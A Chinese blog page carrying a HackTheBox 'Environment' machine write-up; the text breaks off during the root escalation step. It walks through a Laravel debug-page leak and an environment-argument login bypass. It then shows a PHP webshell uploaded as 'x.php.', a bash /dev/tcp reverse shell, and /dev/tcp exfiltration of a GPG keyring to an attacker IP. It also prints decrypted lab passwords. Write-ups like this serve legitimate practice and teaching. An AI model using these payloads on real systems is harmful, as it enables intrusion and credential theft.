<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/yBQJLYy5vKYVdUmksNnT4/_buildManifest.js" defer=""></script><script src="/_next/static/yBQJLYy5vKYVdUmksNnT4/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxMachine - Environment","contentHtml":"\u003ch1\u003eMachine - Environment\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Environment\"\u003ehttps://app.hackthebox.com/machines/Environment\u003c/a\u003e | \u003ccode\u003eLinux\u003c/code\u003e | \u003ccode\u003eMedium\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Environment nmap -sT -min-rate 10000 -p- 10.10.11.67\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 01:13 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e environment.htb (10.10.11.67)\nHost is up (0.30s latency).\nNot shown: 65522 filtered tcp ports (no-response)\nPORT     STATE  SERVICE\n21/tcp   closed ftp\n22/tcp   open   ssh\n80/tcp   open   http\n110/tcp  closed pop3\n113/tcp  closed ident\n135/tcp  closed msrpc\n143/tcp  closed imap\n443/tcp  closed https\n445/tcp  closed microsoft-ds\n995/tcp  closed pop3s\n1720/tcp closed h323q931\n5900/tcp closed vnc\n8080/tcp closed http-proxy\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 44.10 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Environment nmap -sT -A -T4 -O -p 22,80 10.10.11.67\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 01:10 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e environment.htb (10.10.11.67)\nHost is up (0.43s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n| ssh-hostkey: \n|   256 5c:02:33:95:ef:44:e2:80:\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e:3a:96:02:23:f1:92:64 (ECDSA)\n|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)\n80/tcp open  http    nginx 1.22.1\n|_http-server-header: nginx/1.22.1\n|_http-title: Save the Environment | environment.htb\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   484.29 ms 10.10.16.1\n2   303.43 ms environment.htb (10.10.11.67)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 32.49 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e 服务\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可能是开发环境？\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e扫描一下目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Environment dirsearch -u http://environment.htb -x 403,404,429 -e php,zip,txt                  \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Environment/reports/http_environment.htb/_25-05-06_01-40-51.txt\n\nTarget: http://environment.htb/\n\n[01:40:51] Starting: \n[01:42:23] 301 -  169B  - /build  -\u003e  http://environment.htb/build/\n[01:42:44] 200 -    0B  - /favicon.ico\n[01:42:58] 200 -    2KB - /index.php/login/\n[01:43:07] 200 -    2KB - /login\n[01:43:07] 200 -    2KB - /login/\n[01:43:08] 302 -  358B  - /logout  -\u003e  http://environment.htb/login\n[01:43:08] 302 -  358B  - /logout/  -\u003e  http://environment.htb/login\n[01:43:35] 200 -   24B  - /robots.txt\n[01:43:45] 301 -  169B  - /storage  -\u003e  http://environment.htb/storage/\n[01:43:56] 405 -  245KB - /upload\n[01:43:56] 405 -  245KB - /upload/\n\nTask Completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e/upload\u003c/code\u003e ，直接访问能得到 \u003ccode\u003ePHP 8.2.28\u003c/code\u003e \u003ccode\u003eLaravel 11.30.0\u003c/code\u003e 并且开启了\u003ccode\u003eAPP_DEBUG=true\u003c/code\u003e（因为看的到调试页面），错误中显示了一部分代码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eAPP_DEBUG 利用\u003c/h3\u003e\n\u003cp\u003e我们到登陆页面尝试让其弹出 \u003ccode\u003estracktrace\u003c/code\u003e 页面，查看一下上下代码\u003c/p\u003e\n\u003cp\u003e修改成一个不存在的方法即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是也没有发现什么\u003c/p\u003e\n\u003cp\u003e然后测试时将 \u003ccode\u003eremember\u003c/code\u003e 的参数去掉，就能得到 \u003ccode\u003e500\u003c/code\u003e 错误\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e并且泄露了登录逻辑，看代码是开发者给自己留了捷径\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$keep_loggedin\u003c/span\u003e !== False) {\n    // TODO: Keep user logged \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e he selects \u003cspan class=\"hljs-string\"\u003e\"Remember Me?\"\u003c/span\u003e\n    }\n \n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(App::environment() == \u003cspan class=\"hljs-string\"\u003e\"preprod\"\u003c/span\u003e) { //QOL: login directly as me \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e dev/local/preprod envs\n        \u003cspan class=\"hljs-variable\"\u003e$request\u003c/span\u003e-\u003esession()-\u003eregenerate();\n        \u003cspan class=\"hljs-variable\"\u003e$request\u003c/span\u003e-\u003esession()-\u003eput(\u003cspan class=\"hljs-string\"\u003e'user_id'\u003c/span\u003e, 1);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e redirect(\u003cspan class=\"hljs-string\"\u003e'/management/dashboard'\u003c/span\u003e);\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e构造链接，根据佬们提示，可以使用的 \u003cstrong\u003e\u003ccode\u003e--env=preprod\u003c/code\u003e\u003c/strong\u003e 进入分支，发送数据包后重定向到 \u003cstrong\u003e\u003ccode\u003e/management/dashboard\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后就成功进入后台了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e文件上传\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eProfile\u003c/code\u003e 页面还有上传功能点\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试发现能上传 \u003ccode\u003e.user.ini\u003c/code\u003e ，但是有个坑，多次上传会提示：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{\u003cspan class=\"hljs-string\"\u003e\"error\"\u003c/span\u003e:{\u003cspan class=\"hljs-string\"\u003e\"message\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"A file with this name already exists!\"\u003c/span\u003e}}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后测试可以上传 \u003ccode\u003ex.php.\u003c/code\u003e 的文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e访问上传的路径，成功解析\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e上传一句话木马\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e-----------------------------36025816183919919027932701280\nContent-Disposition: form-data; name=\u003cspan class=\"hljs-string\"\u003e\"upload\"\u003c/span\u003e; filename=\u003cspan class=\"hljs-string\"\u003e\"6.php.\"\u003c/span\u003e\nContent-Type:image/png\n\nGIF89a\n\u0026#x3C;?php @\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(system(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[1]));?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e1=%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F\u0026#x3C;YOUR_IP\u003e%2F\u0026#x3C;YOUR_PORT\u003e+0%3E%261%27\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To Hish\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003ehish\u003c/code\u003e 用户家目录能找到 user.txt\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@environment:/home/hish$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\n\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt\nb3fc4246b5457791238ca88f08f93f9d\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e解密 PGP\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003ebackup\u003c/code\u003e 目录找到 \u003ccode\u003egpg\u003c/code\u003e ，应该是要用 \u003ccode\u003egpg key\u003c/code\u003e 进行登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@environment:/home/hish/backup$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nkeyvault.gpg\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@environment:/home/hish/.gnupg$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nopenpgp-revocs.d   pubring.kbx   random_seed\nprivate-keys-v1.d  pubring.kbx~  trustdb.gpg\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看文件类型\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@environment:/home/hish/.gnupg$ file ../backup/keyvault.gpg \n../backup/keyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA (Encrypt or Sign) 2048b .\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试解密，发现权限不足\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@environment:/home/hish$ gpg --homedir /home/hish/.gnupg --decrypt /home/hish/backup/keyvault.gpg \ngpg: WARNING: unsafe ownership on homedir \u003cspan class=\"hljs-string\"\u003e'/home/hish/.gnupg'\u003c/span\u003e\ngpg: failed to create temporary file \u003cspan class=\"hljs-string\"\u003e'/home/hish/.gnupg/.#lk0x000055f4a7783a60.environment.18159'\u003c/span\u003e: Permission denied\ngpg: can\u003cspan class=\"hljs-string\"\u003e't connect to the agent: Permission denied\ngpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11\n      \"hish_ \u0026#x3C;hish@environment.htb\u003e\"\ngpg: decryption failed: No secret key\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将 \u003ccode\u003e.gnupg\u003c/code\u003e 和 \u003ccode\u003ekeyvault.gpg\u003c/code\u003e 都拉到 \u003ccode\u003eKali\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@environment:/home/hish$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e backup/keyvault.gpg \u003e /dev/tcp/10.10.16.27/1235\n\nwww-data@environment:/home/hish$ tar -cvf /tmp/.gnupg.tar .gnupg/\n.gnupg/\n.gnupg/private-keys-v1.d/\n.gnupg/private-keys-v1.d/C2DF4CF8B7B94F1EEC662473E275A0E483A95D24.key\n.gnupg/private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key\n.gnupg/trustdb.gpg\n.gnupg/pubring.kbx\n.gnupg/openpgp-revocs.d/\n.gnupg/openpgp-revocs.d/F45830DFB638E66CD8B752A012F42AE5117FFD8E.rev\n.gnupg/pubring.kbx~\n.gnupg/random_seed\n\nwww-data@environment:/home/hish$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /tmp/.gnupg.tar \u003e /dev/tcp/10.10.16.27/1235\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再次解密，得到密码：\u003ccode\u003emarineSPm@ster!!\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Environment gpg --homedir .gnupg --decrypt keyvault.gpg \ngpg: 警告：家目录‘/root/Desktop/test/Environment/.gnupg’的所有权不安全\ngpg: 由 2048 位的 RSA 密钥加密，标识为 B755B0EDD6CFCFD3，生成于 2025-01-11\n      “hish_ \u0026#x3C;hish@environment.htb\u003e”\nPAYPAL.COM -\u003e Ihaves0meMon\u003cspan class=\"hljs-variable\"\u003e$yhere123\u003c/span\u003e\nENVIRONMENT.HTB -\u003e marineSPm@ster!!\nFACEBOOK.COM -\u003e summerSunnyB3ACH!!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Environment ssh hish@environment.htb      \nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'environment.htb (10.10.11.67)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:GKtBN7PjK58Q8eTT80jQMUZYS5ZLu8ccptkyIueks18.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003eenvironment.htb\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\nhish@environment.htb'\u003c/span\u003es password: \nLinux environment 6.1.0-34-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP PREEMPT_DYNAMIC Debian 6.1.135-1 (2025-04-25) x86_64\u003c/span\u003e\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue May 6 21:51:47 2025 from 10.10.16.27\nhish@environment:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - To Root\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehish@environment:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e hish: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e hish on environment:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=\u003cspan class=\"hljs-string\"\u003e\"ENV BASH_ENV\"\u003c/span\u003e, use_pty\n\nUser hish may run the following commands on environment:\n    (ALL) /usr/bin/systeminfo\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e路径劫持\u003c/h3\u003e\n\u003cp\u003e执行后会运行一些命令，例如 \u003ccode\u003enetstat\u003c/code\u003e 等\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Environment/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehish@environment:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /usr/bin/systeminfo \n\u003cspan class=\"hljs-comment\"\u003e#!/bin/bash\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Displaying kernel ring buffer logs (dmesg) ###\"\u003c/span\u003e\ndmesg | \u003cspan class=\"hljs-built_in\"\u003etail\u003c/span\u003e -n 10\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Checking system-wide open ports ###\"\u003c/span\u003e\nss -antlp\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Displaying information about all mounted filesystems ###\"\u003c/span\u003e\nmount | column -t\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Checking system resource limits ###\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eulimit\u003c/span\u003e -a\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Displaying loaded kernel modules ###\"\u003c/span\u003e\nlsmod | \u003cspan class=\"hljs-built_in\"\u003ehead\u003c/span\u003e -n 10\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n### Checking disk usage for all filesystems 